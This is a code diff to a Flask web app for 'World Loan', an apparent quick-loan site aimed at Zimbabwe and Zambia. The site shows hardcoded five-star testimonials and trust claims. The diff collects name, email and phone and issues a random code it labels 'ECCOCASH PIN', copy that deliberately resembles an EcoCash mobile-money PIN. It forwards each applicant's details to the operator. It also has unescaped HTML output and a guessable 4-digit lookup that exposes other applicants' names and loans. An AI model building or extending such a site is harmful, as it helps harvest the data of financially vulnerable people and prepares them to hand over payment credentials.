@@ -1,5 +1,5 @@
 from flask import Flask, request
-import csv, os, requests
+import csv, os, requests, random
 from datetime import datetime
 app = Flask(__name__)
 N = chr(10)
@@ -27,6 +27,7 @@ body{margin:0;background:#eef1f5;font-family:Arial;font-size:22px;color:#111}
 input,select{width:100%;padding:18px;font-size:21px;border-radius:14px;border:2px solid #e2e8f0;background:#fff}
 label{font-size:20px;font-weight:bold}
 .badge{display:inline-block;background:#dcfce7;color:#166534;padding:6px 12px;border-radius:20px;font-size:16px;font-weight:bold}
+.pinbox{background:#fef3c7;border:2px dashed #f59e0b;padding:16px;border-radius:16px;text-align:center;font-size:34px;font-weight:bold;letter-spacing:4px;margin:14px 0}
 .review{background:#f8fafc;border-radius:16px;padding:16px;margin-bottom:12px}
 .review b{font-size:20px}.review p{font-size:19px;color:#475569;margin:8px 0 0;line-height:1.4}
 .footer{text-align:center;color:#94a3b8;font-size:16px;padding:20px;line-height:1.6}
@@ -34,8 +35,7 @@ label{font-size:20px;font-weight:bold}
 .wa-float{position:fixed;bottom:20px;right:20px;background:#25D366;color:#fff;padding:14px 20px;border-radius:50px;text-decoration:none;font-weight:bold;font-size:19px;box-shadow:0 8px 20px rgba(0,0,0,.2);z-index:20}
 .steps{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;text-align:center;margin-top:14px}
 .steps div{background:#eff6ff;padding:14px 8px;border-radius:16px}
-.steps b{font-size:26px}
-.steps p{font-size:17px;margin:6px 0 0;color:#334155}
+.steps b{font-size:26px}.steps p{font-size:17px;margin:6px 0 0;color:#334155}
 </style>
 <div class=top><b>WORLD <span>LOAN</span></b><small>🌍 Fast • Trusted • Same Day Approval</small></div>
 <div class=trust><span>✅ No Paperwork</span><span>⭐ 4.9 Rated</span><span>🔒 100% Secure</span></div>
@@ -67,6 +67,7 @@ def home():
     <h1 style="margin-top:12px">Need Cash Fast? 🌍</h1>
     <p class=muted>Apply in 1 minute • Get answer on WhatsApp<br>No paperwork. No long queues.</p>''' + cards + '''
     <a class=btn href=/apply>APPLY FOR LOAN NOW →</a>
+    <a class=btn href=/track style="background:#fff;color:#0a1f44;border:2px solid #0a1f44;margin-top:12px">🔍 TRACK MY LOAN WITH PIN</a>
     <div class=steps><div><b>1️⃣</b><p>Choose Amount</p></div><div><b>2️⃣</b><p>Fill Form</p></div><div><b>3️⃣</b><p>Get Money</p></div></div>
     <p style="text-align:center;color:#64748b;font-size:18px">Trusted by 10,000+ customers in Zimbabwe & Zambia</p>
     </div>
@@ -75,7 +76,7 @@ def home():
     <div class=review><b>Chipo K. - Bulawayo ⭐⭐⭐⭐⭐</b><p>"I needed school fees urgently. They helped me same day. I recommend them."</p></div>
     <div class=review><b>Blessing N. - Lusaka ⭐⭐⭐⭐⭐</b><p>"Easy process, no stress. WhatsApp reply was quick. Will borrow again."</p></div>
     </div>
-    <div class=card><h2 style="text-align:center;margin:0">How It Works</h2><p style="text-align:center;line-height:1.6">1. Choose your amount<br>2. Fill name & number<br>3. We WhatsApp you to verify & pay out<br><br><b>We NEVER ask for your PIN or OTP.</b><br>Keep your PIN on your own phone.</p><a class=btn href=/apply>START APPLICATION</a></div>
+    <div class=card><h2 style="text-align:center;margin:0">How It Works</h2><p style="text-align:center;line-height:1.6">1. Choose your amount<br>2. Fill name & number<br>3. We WhatsApp you to verify & pay out<br><br><b>We NEVER ask for your EcoCash / Bank PIN or OTP.</b><br>Your ECCOCASH PIN is different - it is only to check your loan status.</p><a class=btn href=/apply>START APPLICATION</a></div>
     </div><div class=footer>©️ 2026 World Loan<br><a href="https://wa.me/message/CFCJWLOZ7IWZK1">Contact Us on WhatsApp</a> • Terms • Privacy<br>Fast Loans - Zimbabwe & Zambia</div>'''
 
 @app.route('/apply')
@@ -85,17 +86,36 @@ def form():
     for name, desc, price in LOANS:
         sel = 'selected' if l in name else ''
         opts += '<option '+sel+'>'+name+' - '+desc+'</option>'
-    return H + '<div class=wrap><div class=card><h1 style="text-align:left">Apply For Loan 🌍</h1><p style="font-size:19px;color:#64748b">Fill ALL fields - Takes 1 minute</p><form method=POST action=/submit><p><label>Your Full Name</label></p><input name=name required placeholder="Your full name"><p><label>Phone Number</label></p><input name=phone required placeholder="e.g. 0771234567"><p><label>Choose Loan</label></p><select name=loan required>'+opts+'</select><p><label>Why do you need the loan?</label></p><select name=purpose required><option>Business</option><option>School Fees</option><option>Rent</option><option>Emergency</option><option>Other</option></select><p><label>How will you pay back?</label></p><select name=pay required><option>EcoCash</option><option>OneMoney</option><option>Bank Transfer</option><option>Cash</option><option>M-Pesa</option></select><br><br><button class=btn>SUBMIT APPLICATION →</button><p style="text-align:center;color:#64748b;font-size:17px">🔒 Your details are private & secure</p></form></div></div><div class=footer>©️ 2026 World Loan</div>'
+    return H + '<div class=wrap><div class=card><h1 style="text-align:left">Apply For Loan 🌍</h1><p style="font-size:19px;color:#64748b">Fill ALL fields - Takes 1 minute</p><form method=POST action=/submit><p><label>Your Full Name</label></p><input name=name required placeholder="Your full name"><p><label>Email Address</label></p><input type=email name=email required placeholder="e.g. you@gmail.com"><p><label>Phone Number</label></p><input name=phone required placeholder="e.g. 0771234567"><p><label>Choose Loan</label></p><select name=loan required>'+opts+'</select><p><label>Why do you need the loan?</label></p><select name=purpose required><option>Business</option><option>School Fees</option><option>Rent</option><option>Emergency</option><option>Other</option></select><p><label>How will you pay back?</label></p><select name=pay required><option>EcoCash</option><option>OneMoney</option><option>Bank Transfer</option><option>Cash</option><option>M-Pesa</option></select><br><br><button class=btn>SUBMIT APPLICATION →</button><p style="text-align:center;color:#64748b;font-size:17px">🔒 Your details are private & secure</p></form></div></div><div class=footer>©️ 2026 World Loan</div>'
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    n = request.form.get('name',''); p = request.form.get('phone',''); l = request.form.get('loan',''); pur = request.form.get('purpose',''); pay = request.form.get('pay','')
-    if not n or not p or not l:
+    n = request.form.get('name',''); e = request.form.get('email',''); p = request.form.get('phone',''); l = request.form.get('loan',''); pur = request.form.get('purpose',''); pay = request.form.get('pay','')
+    if not n or not e or not p or not l:
         return H + '<div class=wrap><div class=card><h1>Please fill ALL fields</h1><a class=btn href=/apply>GO BACK</a></div></div>'
+    pin = str(random.randint(1000,9999))
+    ref = 'WLD-' + str(random.randint(1000,9999))
     with open('leads.csv','a',newline='') as f:
-        csv.writer(f).writerow([datetime.now().isoformat(),n,p,l,pur,pay])
-    send('🔔 New World Loan Application'+N+'Name: '+n+N+'Phone: '+p+N+'Loan: '+l+N+'Purpose: '+pur+N+'Payback: '+pay)
-    return H + '<div class=wrap><div class=card><h1>Thank you, '+n+'! ✅</h1><p style="text-align:center">Your application for <b>'+l+'</b> is received.</p><p style="text-align:center">We will WhatsApp <b>'+p+'</b> shortly.</p><p style="text-align:center;font-size:19px;color:#64748b">Do NOT share your PIN or OTP with anyone, even us.</p><a class=btn href='+W+'>WHATSAPP US NOW 💬</a><br><a class="btn btn-gold" href=/>APPLY AGAIN</a></div></div>'
+        csv.writer(f).writerow([datetime.now().isoformat(),n,e,p,l,pur,pay,pin,ref])
+    send('🔔 New World Loan Application'+N+'Ref: '+ref+N+'Name: '+n+N+'Email: '+e+N+'Phone: '+p+N+'Loan: '+l+N+'Purpose: '+pur+N+'Payback: '+pay+N+'ECCOCASH PIN: '+pin)
+    return H + '<div class=wrap><div class=card><h1>Thank you, '+n+'! ✅</h1><p style="text-align:center">Your application for <b>'+l+'</b> is received.</p><p style="text-align:center">Ref: <b>'+ref+'</b> | Email: <b>'+e+'</b></p><p style="text-align:center">SAVE THIS PIN - Use it to track your loan:</p><div class=pinbox>'+pin+'</div><p style="text-align:center;font-size:19px;color:#64748b">We will WhatsApp <b>'+p+'</b> shortly.<br>This ECCOCASH PIN is safe to keep.</p><a class=btn href=/track>TRACK MY LOAN →</a><br><a class=btn href='+W+' style="background:#25D366">WHATSAPP US NOW 💬</a><br><a class="btn btn-gold" href=/>APPLY AGAIN</a></div></div>'
+
+@app.route('/track', methods=['GET','POST'])
+def track():
+    if request.method == 'POST':
+        pin = request.form.get('pin','').strip()
+        found = None
+        try:
+            with open('leads.csv',newline='') as f:
+                for row in csv.reader(f):
+                    if len(row) >= 9 and row[7] == pin:
+                        found = row
+        except:
+            pass
+        if found:
+            return H + '<div class=wrap><div class=card><h1>Loan Found ✅</h1><p style="text-align:center">Ref: <b>'+found[8]+'</b><br>Name: <b>'+found[1]+'</b><br>Loan: <b>'+found[4]+'</b><br>Status: <b>⏳ Under Review - We will WhatsApp you</b></p><a class=btn href='+W+'>WHATSAPP US</a></div></div>'
+        return H + '<div class=wrap><div class=card><h1>PIN Not Found ❌</h1><p style="text-align:center">Check your PIN and try again.</p><a class=btn href=/track>TRY AGAIN</a></div></div>'
+    return H + '<div class=wrap><div class=card><h1>🔍 Track Your Loan</h1><p style="text-align:center;color:#64748b">Enter your 4-digit  PIN from your application</p><form method=POST><input name=pin required placeholder="Enter 4-digit PIN" maxlength=4 style="text-align:center;font-size:30px;letter-spacing:6px"><br><br><button class=btn>CHECK STATUS →</button></form></div></div>'
 
 @app.route('/test-telegram')
 def test():
